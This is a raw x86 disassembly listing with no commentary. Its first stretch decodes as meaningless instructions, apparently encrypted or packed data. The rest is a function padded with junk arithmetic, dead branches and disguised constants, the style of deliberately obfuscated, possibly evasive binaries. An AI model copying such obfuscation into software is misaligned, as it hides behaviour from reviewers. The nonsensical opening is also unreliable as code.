  41577f:	mov    cl,BYTE PTR [ebx+eiz*4]
  415782:	jg     0x415752
  415784:	call   0x70c8:0x533e5be6
  41578b:	lds    edi,FWORD PTR [esi-0x3d]
  41578e:	push   ds
  41578f:	cmp    al,ah
  415791:	stos   DWORD PTR es:[edi],eax
  415792:	out    dx,al
  415793:	jnp    0x415777
  415795:	sub    DWORD PTR [esi],edx
  415797:	jb     0x4157f6
  415799:	mov    edi,0xbb5a1804
  41579e:	pop    ebp
  41579f:	xor    edi,DWORD PTR [eax]
  4157a1:	aam    0x83
  4157a3:	addr16 inc esp
  4157a5:	ja     0x4157d9
  4157a7:	inc    esp
  4157a8:	into   
  4157a9:	call   0x740138b1
  4157ae:	xchg   edi,eax
  4157af:	mov    esi,esp
  4157b1:	js     0x4157a9
  4157b3:	dec    ecx
  4157b4:	mov    al,ds:0x3f2aab81
  4157b9:	loopne 0x41575d
  4157bb:	push   ebp
  4157bc:	mov    ecx,0xef241c69
  4157c1:	jge    0x41579d
  4157c3:	rol    DWORD PTR [ecx+0x12b6fb47],cl
  4157c9:	xchg   ecx,eax
  4157ca:	jmp    0x415785
  4157cc:	call   0xf8d83b04
  4157d1:	adc    DWORD PTR [edx-0x5c],ebp
  4157d4:	fisubr DWORD PTR [edx-0x31e1a5d5]
  4157da:	into   
  4157db:	popf   
  4157dc:	lahf   
  4157dd:	or     DWORD PTR [edx+0x29eb06ba],esp
  4157e3:	or     al,0x68
  4157e5:	xchg   ebp,eax
  4157e6:	sbb    ch,al
  4157e8:	call   0xe1c0:0xedfa844
  4157ef:	fisubr WORD PTR [eax+0x1c]
  4157f2:	sub    eax,0xda1fc5c6
  4157f7:	dec    ebp
  4157f8:	cli    
  4157f9:	mov    bl,0x76
  4157fb:	stos   DWORD PTR es:[edi],eax
  4157fc:	or     ah,0xa6
  4157ff:	sbb    DWORD PTR [edi-0xe0b61d5],ecx
  415805:	add    bh,BYTE PTR [ebp-0x80]
  415808:	cmp    ch,BYTE PTR [ecx+0x71c56733]
  41580e:	sar    DWORD PTR [ecx],0x80
  415811:	or     edi,DWORD PTR [esi+eiz*1-0x36c66a68]
  415818:	sbb    al,BYTE PTR [ecx]
  41581a:	cmp    edx,DWORD PTR [esi-0x14]
  41581d:	or     bh,BYTE PTR [edi-0xcde6a9d]
  415823:	enter  0x7c22,0x6
  415827:	xchg   esp,eax
  415828:	arpl   bp,ax
  41582a:	adc    al,0xe9
  41582c:	xchg   ecx,eax
  41582d:	and    DWORD PTR [ecx],edi
  41582f:	sub    ebx,ecx
  415831:	ins    BYTE PTR es:[edi],dx
  415832:	sar    DWORD PTR [ebx],1
  415834:	(bad)  
  415835:	out    dx,al
  415836:	lea    ebp,[esi-0x6ca2b5cc]
  41583c:	jns    0x4158bb
  41583e:	and    al,0x60
  415840:	mov    ds:0x9de724bb,al
  415845:	xor    BYTE PTR [edx+0x25bdec03],dh
  41584b:	(bad)  
  41584d:	sar    DWORD PTR [edx*8+0x1cff582b],0x92
  415855:	adc    eax,edi
  415857:	les    ecx,FWORD PTR [edx+0x477deb95]
  41585d:	jecxz  0x415843
  41585f:	mov    ecx,0xc3d358f5
  415864:	test   BYTE PTR [ebp-0x28f7d213],dh
  41586a:	mov    al,0x22
  41586c:	dec    edx
  41586d:	inc    ebx
  41586e:	adc    dl,dh
  415870:	call   0x91b2d717
  415875:	dec    esp
  415876:	cmp    DWORD PTR [esi+0x1b],0x4
  41587a:	mov    dl,0x38
  41587c:	push   0xffffffa9
  41587e:	add    edi,DWORD PTR ss:[ebx+ebx*8-0x6ffe38d5]
  415886:	clc    
  415887:	jb     0x4158df
  415889:	mov    dh,0x90
  41588b:	test   al,0x39
  41588d:	sub    DWORD PTR [esi+eax*4],ecx
  415890:	bound  eax,QWORD PTR [eax]
  415892:	jo     0x4158f1
  415894:	stos   BYTE PTR es:[edi],al
  415895:	cmp    al,0xc9
  415897:	(bad)  
  415898:	(bad)  
  415899:	fwait
  41589a:	or     eax,0xd48b4361
  41589f:	out    dx,al
  4158a0:	mov    eax,0xa8d41a
  4158a5:	ins    DWORD PTR es:[edi],dx
  4158a6:	inc    edx
  4158a7:	mov    ah,0x9c
  4158a9:	mov    esi,0x48798ba5
  4158ae:	pop    esp
  4158af:	fidiv  DWORD PTR [edi-0x4788ef12]
  4158b5:	(bad)  
  4158b6:	shl    DWORD PTR [eax+0x693a3149],1
  4158bc:	in     eax,0x76
  4158be:	iret   
  4158bf:	xor    DWORD PTR [eax],ecx
  4158c1:	cld    
  4158c2:	scas   al,BYTE PTR es:[edi]
  4158c3:	mov    esi,0xed67ccde
  4158c8:	xor    eax,0x4d76f31
  4158cd:	sbb    ebp,esi
  4158cf:	stos   DWORD PTR es:[edi],eax
  4158d0:	xchg   ecx,eax
  4158d1:	retf   
  4158d2:	jg     0x4158a6
  4158d4:	outs   dx,BYTE PTR ds:[esi]
  4158d5:	add    ah,BYTE PTR [ebp+0x6c]
  4158d8:	mov    dl,BYTE PTR [eax-0x31183bed]
  4158de:	pop    esi
  4158df:	outs   dx,DWORD PTR ds:[esi]
  4158e0:	fbstp  TBYTE PTR [ebp-0x18]
  4158e3:	xor    DWORD PTR ds:0xeb7cfbc3,edi
  4158e9:	cmp    ch,BYTE PTR [edi+0x6c]
  4158ec:	loopne 0x415882
  4158ee:	aas    
  4158ef:	pop    es
  4158f0:	pop    eax
  4158f1:	jbe    0x4158cf
  4158f3:	repz pop esp
  4158f5:	dec    ecx
  4158f6:	imul   ebx,DWORD PTR [edx+eiz*2],0xffffffcd
  4158fa:	sub    eax,0x7528f3cb
  4158ff:	fwait
  415900:	xchg   ebx,eax
  415901:	and    al,0xaa
  415903:	in     eax,dx
  415904:	or     esp,0x5971119a
  41590a:	dec    edx
  41590b:	push   eax
  41590c:	lods   al,BYTE PTR ds:[esi]
  41590d:	jnp    0x4158e1
  41590f:	mov    esi,0xb030fe34
  415914:	cmp    BYTE PTR ds:0xac592a17,ch
  41591a:	sub    esp,DWORD PTR [ecx+edx*8-0x540720fa]
  415921:	push   ebx
  415922:	dec    ecx
  415923:	mov    dh,0x49
  415925:	out    dx,eax
  415926:	bound  edx,QWORD PTR [ebx+ecx*4]
  415929:	mov    al,ds:0x210f2042
  41592e:	mov    fs,WORD PTR [eax+0x14]
  415931:	sub    eax,0x22ea5fc6
  415936:	add    dh,BYTE PTR [edx-0x1c]
  415939:	or     cl,ch
  41593b:	jmp    0xdf25:0xf39f6dac
  415942:	sahf   
  415943:	add    edx,DWORD PTR [edi]
  415945:	push   eax
  415946:	cmp    al,0x33
  415948:	add    eax,DWORD PTR [ecx+0x46bd641b]
  41594e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41594f:	aaa    
  415950:	inc    edi
  415951:	rcl    ebp,cl
  415953:	and    edx,DWORD PTR [edx-0x64]
  415956:	frstor [eax-0x62fbaf82]
  41595c:	je     0x41593f
  41595e:	dec    esp
  41595f:	out    0xc2,al
  415961:	and    al,0x87
  415963:	aad    0x2f
  415965:	sti    
  415966:	or     BYTE PTR [eax],ch
  415968:	jge    0x415909
  41596a:	loopne 0x41591b
  41596c:	ja     0x4159e7
  41596e:	jl     0x4159e1
  415970:	push   ebx
  415971:	cmp    esp,ebp
  415973:	push   ebp
  415974:	adc    al,0x62
  415976:	fld    st(7)
  415978:	jl     0x415994
  41597a:	sub    DWORD PTR [esi-0x47],ecx
  41597d:	sub    eax,0xeb6ef529
  415982:	add    esi,edi
  415984:	xchg   esi,esp
  415986:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415987:	cmc    
  415988:	or     ah,0x5b
  41598b:	sbb    DWORD PTR [esi],ebx
  41598d:	push   ss
  41598e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41598f:	shr    al,1
  415991:	mov    ds:0xaf845424,eax
  415996:	out    0x4a,al
  415998:	in     eax,dx
  415999:	adc    dh,BYTE PTR [eax]
  41599b:	push   ss
  41599c:	mov    eax,ds:0x6cb56c3e
  4159a1:	jne    0x4159c2
  4159a3:	mov    ebx,0x98de4e9b
  4159a8:	ds fwait
  4159aa:	dec    esp
  4159ab:	adc    al,0xa2
  4159ad:	mov    BYTE PTR [ecx+0x2d],bh
  4159b0:	jp     0x415a29
  4159b2:	mov    esp,0x1c815b1c
  4159b7:	xor    BYTE PTR [ebp+ebp*4-0x5093048],cl
  4159be:	cli    
  4159bf:	in     al,0x8b
  4159c1:	inc    ebp
  4159c2:	loopne 0x4159f7
  4159c4:	ror    BYTE PTR [ebx-0x2fdc23bb],1
  4159ca:	mov    eax,DWORD PTR [ebp+0x10]
  4159cd:	xor    edx,0x7015
  4159d3:	sub    eax,edx
  4159d5:	mov    edx,DWORD PTR [ebp-0x28]
  4159d8:	mov    esi,DWORD PTR [ebp-0x2c]
  4159db:	and    edx,0x2a7b
  4159e1:	lea    edx,[edx+esi*1-0x3571]
  4159e8:	mov    esi,DWORD PTR [ebp-0x30]
  4159eb:	shr    edx,1
  4159ed:	or     edx,esi
  4159ef:	mov    esi,ecx
  4159f1:	sub    esi,edx
  4159f3:	add    esi,0x4751
  4159f9:	cmp    esi,eax
  4159fb:	jbe    0x4152ac
  415a01:	pop    esi
  415a02:	leave  
  415a03:	ret    0xc
  415a06:	push   ebp
  415a07:	mov    ebp,esp
  415a09:	sub    esp,0x7c
  415a0c:	xor    DWORD PTR ds:0x42821b,ebx
  415a12:	push   ebx
  415a13:	push   esi
  415a14:	push   edi
  415a15:	or     DWORD PTR ds:0x428357,0x412a
  415a1f:	mov    eax,DWORD PTR [ebp+0x8]
  415a22:	cmp    DWORD PTR ds:0x4281eb,0x0
  415a29:	mov    ebx,0x3b8c
  415a2e:	mov    DWORD PTR ds:0x42814b,0x632c
  415a38:	jmp    0x415aab
  415a3d:	mov    edx,0x517f
  415a42:	mov    edi,DWORD PTR ds:0x4282af
  415a48:	cmp    DWORD PTR ds:0x4281eb,0x0
  415a4f:	jae    0x415a95
  415a55:	push   DWORD PTR [ebp-0x14]
  415a58:	push   DWORD PTR [ebp-0x1c]
  415a5b:	push   DWORD PTR [ebp-0x18]
  415a5e:	push   DWORD PTR [ebp-0x18]
  415a61:	push   0x4a1d
  415a66:	push   0x1f83
  415a6b:	push   DWORD PTR [ebp-0x14]
  415a6e:	call   DWORD PTR ds:0x428ea4
  415a74:	mov    edi,DWORD PTR ds:0x42817f
  415a7a:	xor    ecx,ecx
  415a7c:	or     ecx,DWORD PTR ds:0x42819f
  415a82:	sub    edi,ecx
  415a84:	imul   edi,DWORD PTR [edi+ecx*1]
  415a88:	movzx  edx,WORD PTR ds:0x428137
  415a8f:	and    DWORD PTR ds:0x428363,edx
  415a95:	xor    DWORD PTR ds:0x428203,0x17b
  415a9f:	sbb    DWORD PTR ds:0x4282b7,ecx
  415aa5:	adc    DWORD PTR ds:0x42812b,edi
  415aab:	mov    ecx,DWORD PTR [ebp+0xc]
  415aae:	shrd   eax,ecx,0x2
  415ab2:	shr    ecx,0x2
  415ab5:	mov    ecx,DWORD PTR [ebp+0x8]
  415ab8:	and    edi,0x5809
  415abe:	mov    edx,DWORD PTR [ebp+0xc]
  415ac1:	mov    edi,DWORD PTR ds:0x428133
  415ac7:	xor    DWORD PTR ds:0x42825f,edi
  415acd:	xor    edx,edx
  415acf:	xor    ebx,ebx
  415ad1:	xor    ebx,DWORD PTR ds:0x4281af
  415ad7:	xor    edi,edi
  415ad9:	or     edi,DWORD PTR ds:0x42826b
  415adf:	sub    ebx,edi
  415ae1:	or     ebx,DWORD PTR [ebx+edi*1]
  415ae4:	mov    esi,0x329e695d
  415ae9:	xor    eax,esi
  415aeb:	adc    ebx,0x4305
  415af1:	or     eax,edx
  415af3:	mov    DWORD PTR [ebp-0x28],eax
  415af6:	not    edx
  415af8:	mov    eax,DWORD PTR [ebp+0x8]
  415afb:	sbb    DWORD PTR ds:0x428343,edx
  415b01:	shl    ecx,0x1e
  415b04:	mov    ecx,DWORD PTR [ebp+0xc]
  415b07:	shrd   eax,ecx,0x2
  415b0b:	adc    ebx,0x5b1c
  415b11:	xor    eax,esi
  415b13:	shr    ecx,0x2
  415b16:	sbb    DWORD PTR ds:0x42820f,ecx
  415b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  415b1f:	mov    edi,DWORD PTR ds:0x42818f
  415b25:	mov    edx,DWORD PTR ds:0x4281df
  415b2b:	sub    edx,edi
  415b2d:	and    edi,DWORD PTR [edi+edx*1]
  415b30:	mov    edx,DWORD PTR [ebp+0xc]
  415b33:	cmp    DWORD PTR ds:0x42834f,0x0
  415b3a:	not    DWORD PTR ds:0x4282d3
  415b40:	mov    DWORD PTR ds:0x42822b,0x4d0
  415b4a:	mov    DWORD PTR ds:0x428123,0x25d8
  415b54:	jmp    0x415ba8
  415b59:	mov    DWORD PTR ds:0x428333,0x25ca
  415b63:	cmp    DWORD PTR ds:0x42834f,0x0
  415b6a:	jge    0x415b90
  415b70:	push   DWORD PTR [ebp-0x28]
  415b73:	push   0x42811b
  415b78:	push   0x12d6
  415b7d:	call   DWORD PTR ds:0x428e3c
  415b83:	add    DWORD PTR ds:0x42832b,0x4989
  415b8d:	inc    edi
  415b8e:	add    edi,ebx
  415b90:	sbb    DWORD PTR ds:0x4282df,0x655f
  415b9a:	mov    ebx,DWORD PTR ds:0x4282ab
  415ba0:	adc    DWORD PTR ds:0x4282e7,ebx
  415ba6:	xor    edi,edi
  415ba8:	xor    edx,edx
  415baa:	add    ebx,edi
  415bac:	or     eax,edx
  415bae:	cmp    DWORD PTR ds:0x42813f,0x0
  415bb5:	mov    DWORD PTR ds:0x428137,0x74bf
  415bbf:	mov    DWORD PTR ds:0x4282b7,0x4195
  415bc9:	jmp    0x415c2e
  415bce:	mov    ebx,0x25c0
  415bd3:	mov    ebx,0x1763
  415bd8:	cmp    DWORD PTR ds:0x42813f,0x0
  415bdf:	jl     0x415c13
  415be5:	push   0x432b
  415bea:	push   0x428217
  415bef:	call   DWORD PTR ds:0x428e40
  415bf5:	sub    edi,DWORD PTR ds:0x428363
  415bfb:	sbb    DWORD PTR ds:0x4282e7,ecx
  415c01:	and    edx,DWORD PTR ds:0x428157
  415c07:	mov    edi,DWORD PTR ds:0x4281ff
  415c0d:	and    DWORD PTR ds:0x42813b,edi
  415c13:	or     DWORD PTR ds:0x428133,0x73d6
  415c1d:	mov    edi,DWORD PTR ds:0x428163
  415c23:	mov    edx,DWORD PTR ds:0x4282eb
  415c29:	sub    edi,edx
  415c2b:	xor    edi,DWORD PTR [edi+edx*1]
  415c2e:	mov    DWORD PTR [ebp-0x28],eax
  415c31:	cmp    DWORD PTR ds:0x42832f,0x0
  415c38:	mov    DWORD PTR ds:0x42835b,ebx
  415c3e:	mov    DWORD PTR ds:0x42812f,ecx
  415c44:	jmp    0x415cab
  415c49:	mov    DWORD PTR ds:0x42814b,edx
  415c4f:	cmp    DWORD PTR ds:0x42832f,0x0
  415c56:	jbe    0x415ca1
  415c5c:	push   0x6725
  415c61:	push   0x4282cb
  415c66:	push   0x8698
  415c6b:	push   0x6e02
  415c70:	push   0x538f
  415c75:	push   DWORD PTR [ebp-0x24]
  415c78:	push   0x8d72
  415c7d:	push   0x8325
  415c82:	call   DWORD PTR ds:0x428d90
  415c88:	mov    edi,DWORD PTR ds:0x428187
  415c8e:	mov    edx,DWORD PTR ds:0x42830f
  415c94:	sub    edi,edx
  415c96:	sub    edi,DWORD PTR [edi+edx*1]
  415c99:	add    DWORD PTR ds:0x4282e7,ebx
  415c9f:	or     edx,ebx
  415ca1:	add    edx,edi
  415ca3:	or     ebx,ebx
  415ca5:	and    ebx,DWORD PTR ds:0x4281ff
  415cab:	mov    eax,ds:0x422398
  415cb0:	xor    edx,0x5bba
  415cb6:	mov    eax,DWORD PTR [eax]
  415cb8:	or     ebx,edx
  415cba:	mov    DWORD PTR [ebp-0xc],eax
  415cbd:	and    edi,0x77ac
  415cc3:	mov    eax,ds:0x4225b8
  415cc8:	mov    eax,DWORD PTR [eax]
  415cca:	cmp    DWORD PTR ds:0x42834b,0x0
  415cd1:	mov    edi,DWORD PTR ds:0x42823b
  415cd7:	mov    ebx,DWORD PTR ds:0x428363
  415cdd:	mov    DWORD PTR ds:0x428203,0x6f52
  415ce7:	jmp    0x415d31
  415cec:	mov    DWORD PTR ds:0x42833b,0x23d0
  415cf6:	cmp    DWORD PTR ds:0x42834b,0x0
  415cfd:	ja     0x415d21
  415d03:	push   DWORD PTR [ebp-0x18]
  415d06:	push   0x1c98
  415d0b:	push   DWORD PTR [ebp-0x1c]
  415d0e:	push   DWORD PTR [ebp-0xc]
  415d11:	call   DWORD PTR ds:0x428d94
  415d17:	or     ebx,edx
  415d19:	or     edx,edi
  415d1b:	adc    edi,0x39b9
  415d21:	and    edx,DWORD PTR ds:0x428227
  415d27:	sbb    edx,edi
  415d29:	add    edx,edi
  415d2b:	sbb    ebx,0x45bb
  415d31:	mov    DWORD PTR [ebp-0x10],eax
  415d34:	xor    DWORD PTR ds:0x42823f,0x428223
  415d3e:	mov    eax,DWORD PTR [ebp-0xc]
  415d41:	sbb    DWORD PTR ds:0x4282cf,0x4085
  415d4b:	mov    eax,DWORD PTR [ebp-0xc]
  415d4e:	mov    ebx,DWORD PTR [ebp+0x8]
  415d51:	cmp    DWORD PTR ds:0x4282e7,0x0
  415d58:	mov    DWORD PTR ds:0x428243,0x5216
  415d62:	not    DWORD PTR ds:0x42821b
  415d68:	mov    edi,0x3d1c
  415d6d:	mov    DWORD PTR ds:0x42823b,0x4705
  415d77:	jmp    0x415dc1
  415d7c:	mov    DWORD PTR ds:0x42825b,ebx
  415d82:	cmp    DWORD PTR ds:0x4282e7,0x0
  415d89:	jg     0x415da3
  415d8f:	push   0x42807b
  415d94:	push   0x428029
  415d99:	call   DWORD PTR ds:0x428d98
  415d9f:	and    edx,edx
  415da1:	sub    edi,edi
  415da3:	xor    edx,edx
  415da5:	xor    edx,DWORD PTR ds:0x42823f
  415dab:	sbb    DWORD PTR ds:0x428363,edx
  415db1:	or     DWORD PTR ds:0x428343,ebx
  415db7:	sbb    DWORD PTR ds:0x428263,0x12ba
  415dc1:	shl    ecx,0x1e
  415dc4:	xor    ecx,ecx
  415dc6:	adc    DWORD PTR ds:0x4282df,ecx
  415dcc:	shld   ecx,eax,0x2
  415dd0:	shl    eax,0x2
  415dd3:	mov    edi,0xca79a575
  415dd8:	mov    edx,0x9c1b89e8
  415ddd:	or     DWORD PTR ds:0x42811f,0x4c83
  415de7:	mov    DWORD PTR [ebp-0x38],ebx
  415dea:	mov    ebx,DWORD PTR [ebp+0xc]
  415ded:	xor    DWORD PTR ds:0x428117,0x6279
  415df7:	xor    eax,edi
  415df9:	sub    DWORD PTR ds:0x42815b,0x428123
  415e03:	xor    ecx,edx
  415e05:	mov    DWORD PTR ds:0x42815b,0x1398
  415e0f:	mov    DWORD PTR [ebp-0x1c],0xa4069bae
  415e16:	mov    DWORD PTR ds:0x42832f,0x5e42
  415e20:	mov    DWORD PTR [ebp-0x18],0xa40692ae
  415e27:	mov    DWORD PTR [ebp-0x34],ebx
  415e2a:	mov    DWORD PTR ds:0x428237,0x218e
  415e34:	cmp    eax,DWORD PTR [ebp-0x38]
  415e37:	mov    DWORD PTR ds:0x428263,0x534
  415e41:	jne    0x415e59
  415e47:	mov    DWORD PTR ds:0x42820f,0x12af
  415e51:	cmp    ecx,ebx
  415e53:	je     0x416649
  415e59:	mov    eax,DWORD PTR [ebp-0x10]
  415e5c:	adc    DWORD PTR ds:0x42823f,edx
  415e62:	mov    eax,DWORD PTR [ebp-0x10]
  415e65:	xor    ecx,ecx
  415e67:	shld   ecx,eax,0x2
  415e6b:	and    DWORD PTR ds:0x4282c7,0x42814f
  415e75:	shl    eax,0x2
  415e78:	xor    ecx,edx
  415e7a:	cmp    DWORD PTR ds:0x428133,0x0
  415e81:	not    edx
  415e83:	mov    DWORD PTR ds:0x4282df,edx
  415e89:	mov    edx,0x6413
  415e8e:	jmp    0x415f0c
  415e93:	mov    DWORD PTR ds:0x42814f,0x1988
  415e9d:	mov    DWORD PTR ds:0x428257,0x1d2b
  415ea7:	cmp    DWORD PTR ds:0x428133,0x0
  415eae:	je     0x415ee8
  415eb4:	push   0x6b61
  415eb9:	push   0x4c93
  415ebe:	call   DWORD PTR ds:0x428d9c
  415ec4:	or     DWORD PTR ds:0x4281f3,0x4f44
  415ece:	or     edx,0x2695
  415ed4:	sub    DWORD PTR ds:0x42832b,0x174
  415ede:	mov    DWORD PTR ds:0x42834f,0x41a3
  415ee8:	mov    edx,DWORD PTR ds:0x42834b
  415eee:	add    edx,DWORD PTR ds:0x42812f
  415ef4:	mov    DWORD PTR ds:0x42834b,edx
  415efa:	or     DWORD PTR ds:0x428337,ecx
  415f00:	mov    edx,DWORD PTR ds:0x4282e7
  415f06:	or     DWORD PTR ds:0x428247,edx
  415f0c:	mov    edx,DWORD PTR [ebp+0x8]
  415f0f:	xor    eax,edi
  415f11:	mov    DWORD PTR ds:0x428257,ecx
  415f17:	mov    edi,DWORD PTR [ebp+0xc]
  415f1a:	cmp    eax,edx
  415f1c:	jne    0x415f34
  415f22:	cmp    ecx,edi
  415f24:	mov    DWORD PTR ds:0x4282df,0x9a6
  415f2e:	je     0x416649
  415f34:	cmp    DWORD PTR ds:0x428113,0x0
  415f3b:	mov    DWORD PTR ds:0x428137,0x3be3
  415f45:	movzx  ebx,WORD PTR ds:0x428337
  415f4c:	not    edi
  415f4e:	jmp    0x415fba
  415f53:	mov    DWORD PTR ds:0x4282d7,ebx
  415f59:	cmp    DWORD PTR ds:0x428113,0x0
  415f60:	jne    0x415fad
  415f66:	push   0x3f61
  415f6b:	push   0x3f0f
  415f70:	push   DWORD PTR [ebp-0x18]
  415f73:	push   0x84fe
  415f78:	push   DWORD PTR [ebp-0x18]
  415f7b:	push   DWORD PTR [ebp-0x10]
  415f7e:	push   0x689e
  415f83:	push   DWORD PTR [ebp-0x18]
  415f86:	push   0x8af6
  415f8b:	call   DWORD PTR ds:0x428ea8
  415f91:	xor    DWORD PTR ds:0x428367,edx
  415f97:	sbb    edi,DWORD PTR ds:0x428243
  415f9d:	sub    DWORD PTR ds:0x4281ff,0x4f5e
  415fa7:	sub    ecx,DWORD PTR ds:0x42833b
  415fad:	add    edi,0xe71
  415fb3:	dec    ecx
  415fb4:	and    ecx,DWORD PTR ds:0x4282e3
  415fba:	mov    eax,DWORD PTR [ebp-0x18]
  415fbd:	and    DWORD PTR ds:0x428333,ebx
  415fc3:	mov    ecx,DWORD PTR [ebp-0x18]
  415fc6:	push   0xfffffffe
  415fc8:	pop    ebx
  415fc9:	and    DWORD PTR ds:0x42814b,0xd25
  415fd3:	xor    ecx,ebx
  415fd5:	movzx  edi,BYTE PTR ds:0x42814b
  415fdc:	add    DWORD PTR ds:0x428233,edi
  415fe2:	shl    ecx,0x1e
  415fe5:	cmp    DWORD PTR ds:0x4281ff,0x0
  415fec:	mov    DWORD PTR ds:0x428353,ecx
  415ff2:	mov    edi,0x37d1
  415ff7:	mov    DWORD PTR ds:0x428367,0x730b
  416001:	mov    edi,0x60e5
  416006:	jmp    0x416062
  41600b:	mov    DWORD PTR ds:0x428333,0x1cd3
  416015:	mov    DWORD PTR ds:0x42812f,0x4bc0
  41601f:	cmp    DWORD PTR ds:0x4281ff,0x0
  416026:	jg     0x41603f
  41602c:	push   0x1ec5
  416031:	call   DWORD PTR ds:0x428eac
  416037:	add    DWORD PTR ds:0x428133,edx
  41603d:	neg    edi
  41603f:	mov    DWORD PTR ds:0x4282d7,0x2c32
  416049:	and    edi,DWORD PTR ds:0x42820f
  41604f:	and    edi,0x1973
  416055:	movzx  edi,WORD PTR ds:0x428207
  41605c:	adc    DWORD PTR ds:0x42822b,edi
  416062:	mov    edi,0xa4069aaf
  416067:	and    DWORD PTR ds:0x42835b,0x1058
  416071:	xor    eax,edi
  416073:	sub    DWORD PTR ds:0x4282c7,0x42823f
  41607d:	shr    eax,0x2
  416080:	or     eax,ecx
  416082:	cmp    DWORD PTR ds:0x42814f,0x0
  416089:	mov    DWORD PTR ds:0x4282e7,0x1e83
  416093:	mov    DWORD PTR ds:0x428343,edx
  416099:	movzx  ecx,WORD PTR ds:0x42821b
  4160a0:	jmp    0x4160ed
  4160a5:	not    ecx
  4160a7:	mov    ecx,DWORD PTR ds:0x428153
  4160ad:	cmp    DWORD PTR ds:0x42814f,0x0
  4160b4:	jg     0x4160e2
  4160ba:	push   DWORD PTR [ebp-0x20]
  4160bd:	push   DWORD PTR [ebp-0x18]
  4160c0:	call   DWORD PTR ds:0x428da0
  4160c6:	adc    DWORD PTR ds:0x4282db,edi
  4160cc:	or     DWORD PTR ds:0x42821b,0x4a59
  4160d6:	mov    ecx,DWORD PTR ds:0x4281ef
  4160dc:	sub    DWORD PTR ds:0x42814b,ecx
  4160e2:	add    DWORD PTR ds:0x42823f,0x16e5
  4160ec:	dec    ecx
  4160ed:	mov    DWORD PTR [ebp-0x34],eax
  4160f0:	mov    eax,ds:0x422518
  4160f5:	and    ecx,DWORD PTR ds:0x42822f
  4160fb:	mov    DWORD PTR [ebp-0x34],eax
  4160fe:	mov    eax,DWORD PTR [ebp-0xc]
  416101:	mov    DWORD PTR [ebp-0x14],eax
  416104:	xor    DWORD PTR ds:0x42833b,ecx
  41610a:	mov    ecx,DWORD PTR [ebp-0x14]
  41610d:	or     DWORD PTR ds:0x428353,0x5817
  416117:	push   0x4
  416119:	cmp    DWORD PTR ds:0x42814b,0x0
  416120:	mov    DWORD PTR ds:0x428333,0x7b16
  41612a:	mov    DWORD PTR ds:0x42814f,0x195b
  416134:	jmp    0x41618b
  416139:	mov    DWORD PTR ds:0x42822b,0x5f2a
  416143:	cmp    DWORD PTR ds:0x42814b,0x0
  41614a:	jle    0x41616d
  416150:	push   DWORD PTR [ebp-0x20]
  416153:	call   DWORD PTR ds:0x428eb0
  416159:	xor    DWORD PTR ds:0x428127,0x42811b
  416163:	sub    DWORD PTR ds:0x428113,0x42813f
  41616d:	sbb    DWORD PTR ds:0x42824f,0x428247
  416177:	and    DWORD PTR ds:0x42823f,0x56d1
  416181:	xor    DWORD PTR ds:0x42822b,0x1431
  41618b:	pop    eax
  41618c:	or     DWORD PTR ds:0x42821f,0x42815b
  416196:	sub    eax,ecx
  416198:	mov    ecx,DWORD PTR [ebp-0x10]
  41619b:	add    ecx,eax
  41619d:	mov    DWORD PTR [ebp-0x24],ecx
  4161a0:	mov    ecx,DWORD PTR ds:0x4281cf
  4161a6:	mov    ecx,DWORD PTR [ecx]
  4161a8:	sbb    DWORD PTR ds:0x428153,ecx
  4161ae:	lea    eax,[ebp-0x30]
  4161b1:	mov    DWORD PTR [ebp-0x2c],eax
  4161b4:	and    eax,0x1e1b
  4161b9:	mov    eax,DWORD PTR [ebp-0x1c]
  4161bc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4161bf:	xor    eax,edi
  4161c1:	xor    ecx,ebx
  4161c3:	sub    DWORD PTR ds:0x42814b,0x428227
  4161cd:	shr    eax,0x2
  4161d0:	and    DWORD PTR ds:0x42824b,0x42820b
  4161da:	shl    ecx,0x1e
  4161dd:	sbb    DWORD PTR ds:0x4282d7,0x4281eb
  4161e7:	or     eax,ecx
  4161e9:	or     DWORD PTR ds:0x428243,0x697f
  4161f3:	mov    DWORD PTR [ebp-0x20],eax
  4161f6:	mov    DWORD PTR [ebp-0x8],0xa4069abe
  4161fd:	mov    eax,DWORD PTR [ebp-0x8]
  416200:	mov    ecx,DWORD PTR [ebp-0x8]
  416203:	xor    eax,edi
  416205:	xor    ecx,ebx
  416207:	shr    eax,0x2
  41620a:	shl    ecx,0x1e
  41620d:	or     ecx,eax
  41620f:	push   ecx
  416210:	lea    eax,[ebp-0x8]
  416213:	push   eax
  416214:	lea    eax,[ebp-0x7c]
  416217:	push   eax
  416218:	call   0x415231
  41621d:	mov    eax,DWORD PTR [ebp-0x8]
  416220:	mov    ecx,DWORD PTR [ebp-0x8]
  416223:	xor    eax,edi
  416225:	xor    ecx,ebx
  416227:	shr    eax,0x2
  41622a:	shl    ecx,0x1e
  41622d:	or     ecx,eax
  41622f:	push   ecx
  416230:	lea    eax,[ebp-0x14]
  416233:	push   eax
  416234:	mov    eax,DWORD PTR [ebp+0x8]
  416237:	mov    ecx,DWORD PTR [ebp+0xc]
  41623a:	shrd   eax,ecx,0x2
  41623e:	shr    ecx,0x2
  416241:	mov    ecx,DWORD PTR [ebp+0x8]
  416244:	mov    edx,DWORD PTR [ebp+0xc]
  416247:	xor    eax,esi
  416249:	xor    edx,edx
  41624b:	or     eax,edx
  41624d:	lea    eax,[ebp+eax*4-0x78]
  416251:	push   eax
  416252:	shl    ecx,0x1e
  416255:	call   0x415231
  41625a:	mov    eax,DWORD PTR [ebp-0x8]
  41625d:	mov    ecx,DWORD PTR [ebp-0x8]
  416260:	xor    eax,edi
  416262:	xor    ecx,ebx
  416264:	shr    eax,0x2
  416267:	shl    ecx,0x1e
  41626a:	or     ecx,eax
  41626c:	push   ecx
  41626d:	lea    eax,[ebp-0x24]
  416270:	push   eax
  416271:	mov    eax,DWORD PTR [ebp+0x10]
  416274:	mov    ecx,DWORD PTR [ebp+0x14]
  416277:	shrd   eax,ecx,0x2
  41627b:	shr    ecx,0x2
  41627e:	mov    ecx,DWORD PTR [ebp+0x10]
  416281:	mov    edx,DWORD PTR [ebp+0x14]
  416284:	xor    eax,esi
  416286:	xor    edx,edx
  416288:	or     eax,edx
  41628a:	lea    eax,[ebp+eax*4-0x78]
  41628e:	push   eax
  41628f:	shl    ecx,0x1e
  416292:	call   0x415231
  416297:	mov    eax,DWORD PTR [ebp-0x8]
  41629a:	mov    ecx,DWORD PTR [ebp-0x8]
